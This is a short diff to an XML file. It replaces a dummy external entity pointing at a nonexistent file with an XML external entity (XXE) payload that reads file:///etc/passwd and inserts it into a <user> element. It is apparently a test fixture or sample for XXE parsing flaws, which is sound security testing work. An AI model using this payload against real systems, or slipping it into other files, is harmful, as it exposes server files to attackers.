@@ -1,4 +1,9 @@
 <?xml version="1.0"?>
-<!DOCTYPE note [
-    <!ENTITY dummy SYSTEM "file:///chemin/fictif/inexistant.txt">
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
+<data>
+  <user>
+    &xxe;
+  </user>
+</data>
